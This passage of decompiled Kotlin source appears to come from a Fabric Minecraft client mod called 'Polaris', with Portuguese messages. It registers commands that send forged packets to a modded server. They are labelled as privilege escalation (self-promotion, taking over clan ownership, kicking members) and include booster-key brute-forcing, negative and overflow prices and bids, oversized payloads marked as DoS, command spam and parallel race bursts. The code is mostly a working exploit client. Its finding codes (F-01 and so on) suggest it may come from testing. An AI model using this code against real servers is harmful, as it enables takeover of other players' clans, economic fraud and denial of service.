                                                                                                                                 Unit.INSTANCE
                                                                                                                              }
                                                                                                                           )
                                                                                                                           1
                                                                                                                        })
                                                                                                                  )
                                                                                                            )
                                                                                                      ) as LiteralArgumentBuilder)
                                                                                                   .then(
                                                                                                      ClientCommandManager.literal("invite")
                                                                                                         .then(
                                                                                                            ClientCommandManager.argument(
                                                                                                                  "playerName",
                                                                                                                  StringArgumentType.string() as ArgumentType
                                                                                                               )
                                                                                                               .executes({ ctx: CommandContext ->
                                                                                                                  val n: java.lang.String = StringArgumentType.getString(
                                                                                                                     ctx, "playerName"
                                                                                                                  )
                                                                                                                  val var10001: Any = ctx.getSource()
                                                                                                                  `this$0`.send(
                                                                                                                     var10001 as FabricClientCommandSource,
                                                                                                                     "InvitePlayerPayload('$n')",
                                                                                                                     { 
                                                                                                                        ClientPlayNetworking.send(
                                                                                                                           InvitePlayerPayload(`$n`) as class_8710
                                                                                                                        )
                                                                                                                        Unit.INSTANCE
                                                                                                                     }
                                                                                                                  )
                                                                                                                  1
                                                                                                               })
                                                                                                         )
                                                                                                   ) as LiteralArgumentBuilder)
                                                                                                .then(
                                                                                                   ClientCommandManager.literal("rename")
                                                                                                      .then(
                                                                                                         ClientCommandManager.argument(
                                                                                                               "newName",
                                                                                                               StringArgumentType.string() as ArgumentType
                                                                                                            )
                                                                                                            .executes({ ctx: CommandContext ->
                                                                                                               val n: java.lang.String = StringArgumentType.getString(
                                                                                                                  ctx, "newName"
                                                                                                               )
                                                                                                               val var10001: Any = ctx.getSource()
                                                                                                               `this$0`.send(
                                                                                                                  var10001 as FabricClientCommandSource,
                                                                                                                  "RenameClanPayload('$n')",
                                                                                                                  { 
                                                                                                                     ClientPlayNetworking.send(
                                                                                                                        RenameClanPayload(`$n`) as class_8710
                                                                                                                     )
                                                                                                                     Unit.INSTANCE
                                                                                                                  }
                                                                                                               )
                                                                                                               1
                                                                                                            })
                                                                                                      )
                                                                                                ) as LiteralArgumentBuilder)
                                                                                             .then(
                                                                                                ClientCommandManager.literal("color")
                                                                                                   .then(
                                                                                                      ClientCommandManager.argument(
                                                                                                            "color",
                                                                                                            StringArgumentType.string() as ArgumentType
                                                                                                         )
                                                                                                         .executes({ ctx: CommandContext ->
                                                                                                            val c: java.lang.String = StringArgumentType.getString(
                                                                                                               ctx, "color"
                                                                                                            )
                                                                                                            val var10001: Any = ctx.getSource()
                                                                                                            `this$0`.send(
                                                                                                               var10001 as FabricClientCommandSource,
                                                                                                               "SetTagColorPayload('$c')",
                                                                                                               { 
                                                                                                                  ClientPlayNetworking.send(
                                                                                                                     SetTagColorPayload(`$c`) as class_8710
                                                                                                                  )
                                                                                                                  Unit.INSTANCE
                                                                                                               }
                                                                                                            )
                                                                                                            1
                                                                                                         })
                                                                                                   )
                                                                                             ) as LiteralArgumentBuilder)
                                                                                          .then(
                                                                                             ClientCommandManager.literal("upgrade")
                                                                                                .executes({ ctx: CommandContext ->
                                                                                                   val var10001: Any = ctx.getSource()
                                                                                                   `this$0`.send(
                                                                                                      var10001 as FabricClientCommandSource,
                                                                                                      "UpgradeClanPayload",
                                                                                                      { 
                                                                                                         ClientPlayNetworking.send(
                                                                                                            UpgradeClanPayload.INSTANCE as class_8710
                                                                                                         )
                                                                                                         Unit.INSTANCE
                                                                                                      }
                                                                                                   )
                                                                                                   1
                                                                                                })
                                                                                          ) as LiteralArgumentBuilder)
                                                                                       .then(
                                                                                          ClientCommandManager.literal("booster")
                                                                                             .then(
                                                                                                ClientCommandManager.argument(
                                                                                                      "boosterKey", StringArgumentType.string() as ArgumentType
                                                                                                   )
                                                                                                   .executes({ ctx: CommandContext ->
                                                                                                      val k: java.lang.String = StringArgumentType.getString(
                                                                                                         ctx, "boosterKey"
                                                                                                      )
                                                                                                      val var10001: Any = ctx.getSource()
                                                                                                      `this$0`.send(
                                                                                                         var10001 as FabricClientCommandSource,
                                                                                                         "BuyClanBoosterPayload('$k') — bypass de role?",
                                                                                                         { 
                                                                                                            ClientPlayNetworking.send(
                                                                                                               BuyClanBoosterPayload(`$k`) as class_8710
                                                                                                            )
                                                                                                            Unit.INSTANCE
                                                                                                         }
                                                                                                      )
                                                                                                      1
                                                                                                   })
                                                                                             )
                                                                                       ) as LiteralArgumentBuilder)
                                                                                    .then(
                                                                                       ClientCommandManager.literal("brute_booster")
                                                                                          .executes({ ctx: CommandContext ->
                                                                                             val var10001: Any = ctx.getSource()
                                                                                             `this$0`.bruteForceBoosterKeys(
                                                                                                var10001 as FabricClientCommandSource
                                                                                             )
                                                                                             1
                                                                                          })
                                                                                    ) as LiteralArgumentBuilder)
                                                                                 .then(
                                                                                    ClientCommandManager.literal("booster_spam")
                                                                                       .then(
                                                                                          ClientCommandManager.argument(
                                                                                                "boosterKey", StringArgumentType.string() as ArgumentType
                                                                                             )
                                                                                             .then(
                                                                                                ClientCommandManager.argument(
                                                                                                      "n", IntegerArgumentType.integer(1, 200) as ArgumentType
                                                                                                   )
                                                                                                   .executes({ ctx: CommandContext ->
                                                                                                      val k: java.lang.String = StringArgumentType.getString(
                                                                                                         ctx, "boosterKey"
                                                                                                      )
                                                                                                      val n: Int = IntegerArgumentType.getInteger(ctx, "n")
                                                                                                      var var10001: FabricClientCommandSource = (FabricClientCommandSource)ctx.getSource()
                                                                                                      var10001 = var10001
                                                                                                      `this$0`.boosterSpam(var10001, k, n)
                                                                                                      1
                                                                                                   })
                                                                                             )
                                                                                       )
                                                                                 ) as LiteralArgumentBuilder)
                                                                              .then(
                                                                                 ClientCommandManager.literal("whoami")
                                                                                    .executes(
                                                                                       { ctx: CommandContext ->
                                                                                          var var10001: Any = ctx.getSource()
                                                                                          `this$0`.msg(
                                                                                             var10001 as FabricClientCommandSource,
                                                                                             ">> Clan whoami:",
                                                                                             class_124.field_1075
                                                                                          )
                                                                                          var10001 = ctx.getSource()
                                                                                          `this$0`.msg(
                                                                                             var10001 as FabricClientCommandSource,
                                                                                             "   selfUuid : ${ClanClientData.INSTANCE.getSelfUuid()}",
                                                                                             class_124.field_1060
                                                                                          )
                                                                                          var10001 = ctx.getSource()
                                                                                          `this$0`.msg(
                                                                                             var10001 as FabricClientCommandSource,
                                                                                             "   selfRole : ${ClanClientData.INSTANCE.getSelfRole()}",
                                                                                             class_124.field_1060
                                                                                          )
                                                                                          var10001 = ctx.getSource()
                                                                                          `this$0`.msg(
                                                                                             var10001 as FabricClientCommandSource,
                                                                                             "   hasClan  : ${ClanClientData.INSTANCE.getHasClan()}",
                                                                                             class_124.field_1080
                                                                                          )
                                                                                          var10001 = ctx.getSource()
                                                                                          `this$0`.msg(
                                                                                             var10001 as FabricClientCommandSource,
                                                                                             "   clanName : ${ClanClientData.INSTANCE.getClanName()}",
                                                                                             class_124.field_1080
                                                                                          )
                                                                                          1
                                                                                       }
                                                                                    )
                                                                              ) as LiteralArgumentBuilder)
                                                                           .then(ClientCommandManager.literal("members").executes({ ctx: CommandContext ->
                                                                              val var10001: Any = ctx.getSource()
                                                                              `this$0`.listClanMembers(var10001 as FabricClientCommandSource)
                                                                              1
                                                                           })) as LiteralArgumentBuilder)
                                                                        .then(
                                                                           ClientCommandManager.literal("promote_self")
                                                                              .executes(
                                                                                 { ctx: CommandContext ->
                                                                                    val uuid: UUID = ClanClientData.INSTANCE.getSelfUuid()
                                                                                    var var10001: Any = ctx.getSource()
                                                                                    `this$0`.send(
                                                                                       var10001 as FabricClientCommandSource,
                                                                                       "PRIV-ESC: PromoteMemberPayload(self=$uuid)",
                                                                                       { 
                                                                                          ClientPlayNetworking.send(PromoteMemberPayload(`$uuid`) as class_8710)
                                                                                          Unit.INSTANCE
                                                                                       }
                                                                                    )
                                                                                    var10001 = ctx.getSource()
                                                                                    `this$0`.msg(
                                                                                       var10001 as FabricClientCommandSource,
                                                                                       "   Depois: /polaris clan whoami pra ver se role mudou.",
                                                                                       class_124.field_1054
                                                                                    )
                                                                                    1
                                                                                 }
                                                                              )
                                                                        ) as LiteralArgumentBuilder)
                                                                     .then(
                                                                        ClientCommandManager.literal("promote_uuid")
                                                                           .then(
                                                                              ClientCommandManager.argument(
                                                                                    "targetUuid", StringArgumentType.word() as ArgumentType
                                                                                 )
                                                                                 .executes({ ctx: CommandContext ->
                                                                                    val id: UUID = UUID.fromString(
                                                                                       StringArgumentType.getString(ctx, "targetUuid")
                                                                                    )
                                                                                    val var10001: Any = ctx.getSource()
                                                                                    `this$0`.send(
                                                                                       var10001 as FabricClientCommandSource,
                                                                                       "PRIV-ESC: PromoteMemberPayload($id)",
                                                                                       { 
                                                                                          ClientPlayNetworking.send(PromoteMemberPayload(`$id`) as class_8710)
                                                                                          Unit.INSTANCE
                                                                                       }
                                                                                    )
                                                                                    1
                                                                                 })
                                                                           )
                                                                     ) as LiteralArgumentBuilder)
                                                                  .then(
                                                                     ClientCommandManager.literal("demote_uuid")
                                                                        .then(
                                                                           ClientCommandManager.argument(
                                                                                 "targetUuid", StringArgumentType.word() as ArgumentType
                                                                              )
                                                                              .executes({ ctx: CommandContext ->
                                                                                 val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "targetUuid"))
                                                                                 val var10001: Any = ctx.getSource()
                                                                                 `this$0`.send(
                                                                                    var10001 as FabricClientCommandSource,
                                                                                    "PRIV-ESC: DemoteMemberPayload($id)",
                                                                                    { 
                                                                                       ClientPlayNetworking.send(DemoteMemberPayload(`$id`) as class_8710)
                                                                                       Unit.INSTANCE
                                                                                    }
                                                                                 )
                                                                                 1
                                                                              })
                                                                        )
                                                                  ) as LiteralArgumentBuilder)
                                                               .then(
                                                                  ClientCommandManager.literal("transfer_to_self")
                                                                     .executes(
                                                                        { ctx: CommandContext ->
                                                                           val uuid: UUID = ClanClientData.INSTANCE.getSelfUuid()
                                                                           var var10001: Any = ctx.getSource()
                                                                           `this$0`.send(
                                                                              var10001 as FabricClientCommandSource,
                                                                              "PRIV-ESC: TransferOwnershipPayload(self=$uuid)",
                                                                              { 
                                                                                 ClientPlayNetworking.send(TransferOwnershipPayload(`$uuid`) as class_8710)
                                                                                 Unit.INSTANCE
                                                                              }
                                                                           )
                                                                           var10001 = ctx.getSource()
                                                                           `this$0`.msg(
                                                                              var10001 as FabricClientCommandSource,
                                                                              "   Server seguro: 'Apenas o dono pode transferir'",
                                                                              class_124.field_1060
                                                                           )
                                                                           var10001 = ctx.getSource()
                                                                           `this$0`.msg(
                                                                              var10001 as FabricClientCommandSource,
                                                                              "   DUPE de poder: vc vira OWNER = controle total do clã.",
                                                                              class_124.field_1061
                                                                           )
                                                                           1
                                                                        }
                                                                     )
                                                               ) as LiteralArgumentBuilder)
                                                            .then(
                                                               ClientCommandManager.literal("transfer_uuid")
                                                                  .then(
                                                                     ClientCommandManager.argument("targetUuid", StringArgumentType.word() as ArgumentType)
                                                                        .executes({ ctx: CommandContext ->
                                                                           val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "targetUuid"))
                                                                           val var10001: Any = ctx.getSource()
                                                                           `this$0`.send(
                                                                              var10001 as FabricClientCommandSource,
                                                                              "PRIV-ESC: TransferOwnershipPayload($id)",
                                                                              { 
                                                                                 ClientPlayNetworking.send(TransferOwnershipPayload(`$id`) as class_8710)
                                                                                 Unit.INSTANCE
                                                                              }
                                                                           )
                                                                           1
                                                                        })
                                                                  )
                                                            ) as LiteralArgumentBuilder)
                                                         .then(
                                                            ClientCommandManager.literal("kick_uuid")
                                                               .then(
                                                                  ClientCommandManager.argument("targetUuid", StringArgumentType.word() as ArgumentType)
                                                                     .executes({ ctx: CommandContext ->
                                                                        val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "targetUuid"))
                                                                        val var10001: Any = ctx.getSource()
                                                                        `this$0`.send(
                                                                           var10001 as FabricClientCommandSource, "PRIV-ESC: KickMemberPayload($id)", { 
                                                                              ClientPlayNetworking.send(KickMemberPayload(`$id`) as class_8710)
                                                                              Unit.INSTANCE
                                                                           }
                                                                        )
                                                                        1
                                                                     })
                                                               )
                                                         ) as LiteralArgumentBuilder)
                                                      .then(
                                                         ClientCommandManager.literal("promote_self_burst")
                                                            .then(
                                                               ClientCommandManager.argument("n", IntegerArgumentType.integer(1, 200) as ArgumentType)
                                                                  .executes({ ctx: CommandContext ->
                                                                     val n: Int = IntegerArgumentType.getInteger(ctx, "n")
                                                                     val uuid: UUID = ClanClientData.INSTANCE.getSelfUuid()
                                                                     val var10001: Any = ctx.getSource()
                                                                     `this$0`.promoteSelfBurst(var10001 as FabricClientCommandSource, uuid, n)
                                                                     1
                                                                  })
                                                            )
                                                      ) as LiteralArgumentBuilder)
                                                   .then(ClientCommandManager.literal("priv_esc_full").executes({ ctx: CommandContext ->
                                                      val var10001: Any = ctx.getSource()
                                                      `this$0`.privEscFull(var10001 as FabricClientCommandSource)
                                                      1
                                                   })) as LiteralArgumentBuilder)
                                                .then(ClientCommandManager.literal("trial_convocar").executes({ ctx: CommandContext ->
                                                   val var10001: Any = ctx.getSource()
                                                   `this$0`.runChatCommand(
                                                      var10001 as FabricClientCommandSource, "trial convocar", "F-Trial: tenta /trial convocar (admin-only)"
                                                   )
                                                   1
                                                })) as LiteralArgumentBuilder)
                                             .then(ClientCommandManager.literal("trial_entrar").executes({ ctx: CommandContext ->
                                                val var10001: Any = ctx.getSource()
                                                `this$0`.runChatCommand(
                                                   var10001 as FabricClientCommandSource, "trial entrar", "F-Trial: /trial entrar (member-allowed, controle)"
                                                )
                                                1
                                             })) as LiteralArgumentBuilder)
                                          .then(ClientCommandManager.literal("admin_command_audit").executes({ ctx: CommandContext ->
                                             val var10001: Any = ctx.getSource()
                                             `this$0`.adminCommandAudit(var10001 as FabricClientCommandSource)
                                             1
                                          })) as LiteralArgumentBuilder)
                                       .then(
                                          ClientCommandManager.literal("cmd_spam")
                                             .then(
                                                ClientCommandManager.argument("command", StringArgumentType.greedyString() as ArgumentType)
                                                   .executes({ ctx: CommandContext ->
                                                      val cmd: java.lang.String = StringArgumentType.getString(ctx, "command")
                                                      var var10001: FabricClientCommandSource = (FabricClientCommandSource)ctx.getSource()
                                                      var10001 = var10001
                                                      `this$0`.cmdSpam(var10001, cmd, 20)
                                                      1
                                                   })
                                             )
                                       ) as LiteralArgumentBuilder)
                                    .then(ClientCommandManager.literal("trial_inject").executes({ ctx: CommandContext ->
                                       val var10001: Any = ctx.getSource()
                                       `this$0`.trialInjectionTests(var10001 as FabricClientCommandSource)
                                       1
                                    }))
                              ) as LiteralArgumentBuilder)
                           .then(
                              (((ClientCommandManager.literal("bf")
                                          .then(
                                             ClientCommandManager.literal("select")
                                                .then(
                                                   ClientCommandManager.argument("slot", IntegerArgumentType.integer() as ArgumentType)
                                                      .then(
                                                         ClientCommandManager.argument("poolIndex", IntegerArgumentType.integer() as ArgumentType)
                                                            .executes({ ctx: CommandContext ->
                                                               val s: Int = IntegerArgumentType.getInteger(ctx, "slot")
                                                               val p: Int = IntegerArgumentType.getInteger(ctx, "poolIndex")
                                                               val var10001: Any = ctx.getSource()
                                                               `this$0`.send(
                                                                  var10001 as FabricClientCommandSource, "SelectRentalPayload(slot=$s, poolIndex=$p)", { 
                                                                     ClientPlayNetworking.send(SelectRentalPayload(`$s`, `$p`) as class_8710)
                                                                     Unit.INSTANCE
                                                                  }
                                                               )
                                                               1
                                                            })
                                                      )
                                                )
                                          ) as LiteralArgumentBuilder)
                                       .then(
                                          ClientCommandManager.literal("confirm")
                                             .then(
                                                ClientCommandManager.argument("indicesCsv", StringArgumentType.string() as ArgumentType)
                                                   .then(
                                                      ClientCommandManager.argument("mode", StringArgumentType.string() as ArgumentType)
                                                         .executes({ ctx: CommandContext ->
                                                            val csv: java.lang.String = StringArgumentType.getString(ctx, "indicesCsv")
                                                            val mode: java.lang.String = StringArgumentType.getString(ctx, "mode")
                                                            val `$this$mapNotNullTo$iv$iv`: java.lang.Iterable = StringsKt.split$default(
                                                               csv, arrayOf(","), false, 0, 6, null
                                                            )
                                                            val `destination$iv$iv`: java.util.Collection = ArrayList()

                                                            for (`element$iv$iv$iv` in `$this$mapNotNullTo$iv$iv`) {
                                                               val var21: Any = StringsKt.toIntOrNull(
                                                                  StringsKt.trim(`element$iv$iv$iv` as java.lang.String).toString()
                                                               )
                                                               if (var21 != null) {
                                                                  `destination$iv$iv`.add(var21)
                                                               }
                                                            }

                                                            val indices: java.util.List = `destination$iv$iv` as java.util.List
                                                            val var10001: Any = ctx.getSource()
                                                            `this$0`.send(
                                                               var10001 as FabricClientCommandSource,
                                                               "ConfirmRentalPayload(indices=$indices, mode='$mode')",
                                                               { 
                                                                  ClientPlayNetworking.send(ConfirmRentalPayload(`$indices`, `$mode`) as class_8710)
                                                                  Unit.INSTANCE
                                                               }
                                                            )
                                                            1
                                                         })
                                                   )
                                             )
                                       ) as LiteralArgumentBuilder)
                                    .then(
                                       ClientCommandManager.literal("swap")
                                          .then(
                                             ClientCommandManager.argument("playerSlot", IntegerArgumentType.integer() as ArgumentType)
                                                .then(
                                                   ClientCommandManager.argument("oppSlot", IntegerArgumentType.integer() as ArgumentType)
                                                      .executes({ ctx: CommandContext ->
                                                         val p: Int = IntegerArgumentType.getInteger(ctx, "playerSlot")
                                                         val o: Int = IntegerArgumentType.getInteger(ctx, "oppSlot")
                                                         val var10001: Any = ctx.getSource()
                                                         `this$0`.send(
                                                            var10001 as FabricClientCommandSource, "ConfirmSwapPayload(playerSlot=$p, oppSlot=$o)", { 
                                                               ClientPlayNetworking.send(ConfirmSwapPayload(`$p`, `$o`) as class_8710)
                                                               Unit.INSTANCE
                                                            }
                                                         )
                                                         1
                                                      })
                                                )
                                          )
                                    ) as LiteralArgumentBuilder)
                                 .then(ClientCommandManager.literal("start").executes({ ctx: CommandContext ->
                                    val var10001: Any = ctx.getSource()
                                    `this$0`.send(var10001 as FabricClientCommandSource, "StartBattlePayload", { 
                                       ClientPlayNetworking.send(StartBattlePayload.INSTANCE as class_8710)
                                       Unit.INSTANCE
                                    })
                                    1
                                 }))
                           ) as LiteralArgumentBuilder)
                        .then(
                           (((ClientCommandManager.literal("mode")
                                       .then(
                                          (ClientCommandManager.literal("block_gts_ui")
                                                .then(
                                                   ClientCommandManager.literal("on")
                                                      .executes(
                                                         { ctx: CommandContext ->
                                                            PolarisState.blockGtsUi = true
                                                            val var10001: Any = ctx.getSource()
                                                            `this$0`.msg(
                                                               var10001 as FabricClientCommandSource,
                                                               "\ud83d\udd12 block_gts_ui ON — telas do GTS bloqueadas de abrir",
                                                               class_124.field_1060
                                                            )
                                                            1
                                                         }
                                                      )
                                                ) as LiteralArgumentBuilder)
                                             .then(ClientCommandManager.literal("off").executes({ ctx: CommandContext ->
                                                PolarisState.blockGtsUi = false
                                                val var10001: Any = ctx.getSource()
                                                `this$0`.msg(var10001 as FabricClientCommandSource, "\ud83d\udd13 block_gts_ui OFF", class_124.field_1060)
                                                1
                                             }))
                                       ) as LiteralArgumentBuilder)
                                    .then(
                                       (ClientCommandManager.literal("block_shop_ui").then(ClientCommandManager.literal("on").executes({ ctx: CommandContext ->
                                          PolarisState.blockShopUi = true
                                          val var10001: Any = ctx.getSource()
                                          `this$0`.msg(var10001 as FabricClientCommandSource, "\ud83d\udd12 block_shop_ui ON", class_124.field_1060)
                                          1
                                       })) as LiteralArgumentBuilder).then(ClientCommandManager.literal("off").executes({ ctx: CommandContext ->
                                          PolarisState.blockShopUi = false
                                          val var10001: Any = ctx.getSource()
                                          `this$0`.msg(var10001 as FabricClientCommandSource, "\ud83d\udd13 block_shop_ui OFF", class_124.field_1060)
                                          1
                                       }))
                                    ) as LiteralArgumentBuilder)
                                 .then((ClientCommandManager.literal("block_clan_ui").then(ClientCommandManager.literal("on").executes({ ctx: CommandContext ->
                                    PolarisState.blockClanUi = true
                                    val var10001: Any = ctx.getSource()
                                    `this$0`.msg(var10001 as FabricClientCommandSource, "\ud83d\udd12 block_clan_ui ON", class_124.field_1060)
                                    1
                                 })) as LiteralArgumentBuilder).then(ClientCommandManager.literal("off").executes({ ctx: CommandContext ->
                                    PolarisState.blockClanUi = false
                                    val var10001: Any = ctx.getSource()
                                    `this$0`.msg(var10001 as FabricClientCommandSource, "\ud83d\udd13 block_clan_ui OFF", class_124.field_1060)
                                    1
                                 }))) as LiteralArgumentBuilder)
                              .then(ClientCommandManager.literal("status").executes({ ctx: CommandContext ->
                                 var var10001: Any = ctx.getSource()
                                 `this$0`.msg(var10001 as FabricClientCommandSource, "Modes ativos:", class_124.field_1075)
                                 var10001 = ctx.getSource()
                                 `this$0`.msg(var10001 as FabricClientCommandSource, "  block_gts_ui  = ${PolarisState.blockGtsUi}", class_124.field_1080)
                                 var10001 = ctx.getSource()
                                 `this$0`.msg(var10001 as FabricClientCommandSource, "  block_shop_ui = ${PolarisState.blockShopUi}", class_124.field_1080)
                                 var10001 = ctx.getSource()
                                 `this$0`.msg(var10001 as FabricClientCommandSource, "  block_clan_ui = ${PolarisState.blockClanUi}", class_124.field_1080)
                                 var10001 = ctx.getSource()
                                 `this$0`.msg(var10001 as FabricClientCommandSource, "  block_bf_ui   = ${PolarisState.blockBfUi}", class_124.field_1080)
                                 1
                              }))
                        ) as LiteralArgumentBuilder)
                     .then(
                        ((((((((((((((ClientCommandManager.literal("preset")
                                                                     .then(ClientCommandManager.literal("slot_negativo").executes({ ctx: CommandContext ->
                                                                        val var10001: Any = ctx.getSource()
                                                                        `this$0`.send(
                                                                           var10001 as FabricClientCommandSource,
                                                                           "F-14: ListPokemonPayload(slot=-1, price=1000)",
                                                                           { 
                                                                              ClientPlayNetworking.send(ListPokemonPayload(-1, 1000L) as class_8710)
                                                                              Unit.INSTANCE
                                                                           }
                                                                        )
                                                                        1
                                                                     })) as LiteralArgumentBuilder)
                                                                  .then(ClientCommandManager.literal("slot_max").executes({ ctx: CommandContext ->
                                                                     val var10001: Any = ctx.getSource()
                                                                     `this$0`.send(
                                                                        var10001 as FabricClientCommandSource,
                                                                        "F-14: ListPokemonPayload(slot=Int.MAX, price=1000)",
                                                                        { 
                                                                           ClientPlayNetworking.send(ListPokemonPayload(Integer.MAX_VALUE, 1000L) as class_8710)
                                                                           Unit.INSTANCE
                                                                        }
                                                                     )
                                                                     1
                                                                  })) as LiteralArgumentBuilder)
                                                               .then(ClientCommandManager.literal("slot_min").executes({ ctx: CommandContext ->
                                                                  val var10001: Any = ctx.getSource()
                                                                  `this$0`.send(
                                                                     var10001 as FabricClientCommandSource,
                                                                     "F-14: ListPokemonPayload(slot=Int.MIN, price=1000)",
                                                                     { 
                                                                        ClientPlayNetworking.send(ListPokemonPayload(Integer.MIN_VALUE, 1000L) as class_8710)
                                                                        Unit.INSTANCE
                                                                     }
                                                                  )
                                                                  1
                                                               })) as LiteralArgumentBuilder)
                                                            .then(ClientCommandManager.literal("preco_zero").executes({ ctx: CommandContext ->
                                                               val var10001: Any = ctx.getSource()
                                                               `this$0`.send(
                                                                  var10001 as FabricClientCommandSource, "F-03 edge: ListPokemonPayload(slot=0, price=0)", { 
                                                                     ClientPlayNetworking.send(ListPokemonPayload(0, 0L) as class_8710)
                                                                     Unit.INSTANCE
                                                                  }
                                                               )
                                                               1
                                                            })) as LiteralArgumentBuilder)
                                                         .then(ClientCommandManager.literal("preco_negativo").executes({ ctx: CommandContext ->
                                                            val var10001: Any = ctx.getSource()
                                                            `this$0`.send(
                                                               var10001 as FabricClientCommandSource, "F-03: ListPokemonPayload(slot=0, price=-1)", { 
                                                                  ClientPlayNetworking.send(ListPokemonPayload(0, -1L) as class_8710)
                                                                  Unit.INSTANCE
                                                               }
                                                            )
                                                            1
                                                         })) as LiteralArgumentBuilder)
                                                      .then(ClientCommandManager.literal("preco_long_min").executes({ ctx: CommandContext ->
                                                         val var10001: Any = ctx.getSource()
                                                         `this$0`.send(
                                                            var10001 as FabricClientCommandSource, "F-03: ListPokemonPayload(slot=0, price=Long.MIN_VALUE)", { 
                                                               ClientPlayNetworking.send(ListPokemonPayload(0, java.lang.Long.MIN_VALUE) as class_8710)
                                                               Unit.INSTANCE
                                                            }
                                                         )
                                                         1
                                                      })) as LiteralArgumentBuilder)
                                                   .then(ClientCommandManager.literal("preco_long_max").executes({ ctx: CommandContext ->
                                                      val var10001: Any = ctx.getSource()
                                                      `this$0`.send(
                                                         var10001 as FabricClientCommandSource, "ListPokemonPayload(slot=0, price=Long.MAX_VALUE)", { 
                                                            ClientPlayNetworking.send(ListPokemonPayload(0, java.lang.Long.MAX_VALUE) as class_8710)
                                                            Unit.INSTANCE
                                                         }
                                                      )
                                                      1
                                                   })) as LiteralArgumentBuilder)
                                                .then(ClientCommandManager.literal("duracao_eterna").executes({ ctx: CommandContext ->
                                                   val var10001: Any = ctx.getSource()
                                                   `this$0`.send(
                                                      var10001 as FabricClientCommandSource, "F-04: ListAuctionPayload(slot=0, bid=100, dur=Long.MAX)", { 
                                                         ClientPlayNetworking.send(ListAuctionPayload(0, 100L, java.lang.Long.MAX_VALUE) as class_8710)
                                                         Unit.INSTANCE
                                                      }
                                                   )
                                                   1
                                                })) as LiteralArgumentBuilder)
                                             .then(
                                                ClientCommandManager.literal("bid_zero")
                                                   .then(
                                                      ClientCommandManager.argument("uuid", StringArgumentType.word() as ArgumentType)
                                                         .executes({ ctx: CommandContext ->
                                                            val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "uuid"))
                                                            val var10001: Any = ctx.getSource()
                                                            `this$0`.send(
                                                               var10001 as FabricClientCommandSource, "F-05: PlaceBidPayload(uuid=$id, amount=0)", { 
                                                                  ClientPlayNetworking.send(PlaceBidPayload(`$id`, 0L) as class_8710)
                                                                  Unit.INSTANCE
                                                               }
                                                            )
                                                            1
                                                         })
                                                   )
                                             ) as LiteralArgumentBuilder)
                                          .then(
                                             ClientCommandManager.literal("bid_negativo")
                                                .then(
                                                   ClientCommandManager.argument("uuid", StringArgumentType.word() as ArgumentType)
                                                      .executes({ ctx: CommandContext ->
                                                         val id: UUID = UUID.fromString(StringArgumentType.getString(ctx, "uuid"))
                                                         val var10001: Any = ctx.getSource()
                                                         `this$0`.send(
                                                            var10001 as FabricClientCommandSource, "F-05: PlaceBidPayload(uuid=$id, amount=-1000)", { 
                                                               ClientPlayNetworking.send(PlaceBidPayload(`$id`, -1000L) as class_8710)
                                                               Unit.INSTANCE
                                                            }
                                                         )
                                                         1
                                                      })
                                                )
                                          ) as LiteralArgumentBuilder)
                                       .then(
                                          ClientCommandManager.literal("shop_sell_neg")
                                             .then(
                                                ClientCommandManager.argument("itemId", StringArgumentType.string() as ArgumentType)
                                                   .then(
                                                      ClientCommandManager.argument("qty", IntegerArgumentType.integer() as ArgumentType)
                                                         .executes({ ctx: CommandContext ->
                                                            val item: java.lang.String = StringArgumentType.getString(ctx, "itemId")
                                                            val qty: Int = IntegerArgumentType.getInteger(ctx, "qty")
                                                            val var10001: Any = ctx.getSource()
                                                            `this$0`.send(var10001 as FabricClientCommandSource, "F-01: RequestSellPayload('$item', $qty)", { 
                                                               ClientPlayNetworking.send(RequestSellPayload(`$item`, `$qty`) as class_8710)
                                                               Unit.INSTANCE
                                                            })
                                                            1
                                                         })
                                                   )
                                             )
                                       ) as LiteralArgumentBuilder)
                                    .then(
                                       ClientCommandManager.literal("shop_buy_neg")
                                          .then(
                                             ClientCommandManager.argument("itemId", StringArgumentType.string() as ArgumentType)
                                                .then(
                                                   ClientCommandManager.argument("qty", IntegerArgumentType.integer() as ArgumentType)
                                                      .executes({ ctx: CommandContext ->
                                                         val item: java.lang.String = StringArgumentType.getString(ctx, "itemId")
                                                         val qty: Int = IntegerArgumentType.getInteger(ctx, "qty")
                                                         val var10001: Any = ctx.getSource()
                                                         `this$0`.send(var10001 as FabricClientCommandSource, "F-02: RequestPurchasePayload('$item', $qty)", { 
                                                            ClientPlayNetworking.send(RequestPurchasePayload(`$item`, `$qty`) as class_8710)
                                                            Unit.INSTANCE
                                                         })
                                                         1
                                                      })
                                                )
                                          )
                                    ) as LiteralArgumentBuilder)
                                 .then(
                                    ClientCommandManager.literal("booster_nao_owner")
                                       .then(
                                          ClientCommandManager.argument("boosterKey", StringArgumentType.string() as ArgumentType)
                                             .executes({ ctx: CommandContext ->
                                                val k: java.lang.String = StringArgumentType.getString(ctx, "boosterKey")
                                                val var10001: Any = ctx.getSource()
                                                `this$0`.send(var10001 as FabricClientCommandSource, "F-09: BuyClanBoosterPayload('$k') sem GUI/role-check", { 
                                                   ClientPlayNetworking.send(BuyClanBoosterPayload(`$k`) as class_8710)
                                                   Unit.INSTANCE
                                                })
                                                1
                                             })
                                       )
                                 ) as LiteralArgumentBuilder)
                              .then(ClientCommandManager.literal("clan_nome_gigante").executes({ ctx: CommandContext ->
                                 val huge: java.lang.String = StringsKt.repeat("A", 5000)
                                 val var10001: Any = ctx.getSource()
                                 `this$0`.send(var10001 as FabricClientCommandSource, "F-16: CreateClanPayload com 5000 chars", { 
                                    ClientPlayNetworking.send(CreateClanPayload(`$huge`, "XXXX") as class_8710)
                                    Unit.INSTANCE
                                 })
                                 1
                              })) as LiteralArgumentBuilder)
                           .then(ClientCommandManager.literal("bf_confirm_huge").executes({ ctx: CommandContext ->
                              val huge: java.util.List = CollectionsKt.toList(RangesKt.until(0, 100000) as java.lang.Iterable)
                              val var10001: Any = ctx.getSource()
                              `this$0`.send(var10001 as FabricClientCommandSource, "F-12: ConfirmRentalPayload com 100k slots (DoS)", { 
                                 ClientPlayNetworking.send(ConfirmRentalPayload(`$huge`, "NORMAL") as class_8710)
                                 Unit.INSTANCE
                              })
                              1
                           }))
                     ) as LiteralArgumentBuilder
               )
            }
         )
      }

   private fun listBurst(source: FabricClientCommandSource, slot: Int, price: Long, n: Int) {
      this.send(source, "Race-F: $n × ListPokemonPayload(slot=$slot, price=$price) em PARALELO", { 
         repeat(`$n`) { var6 ->
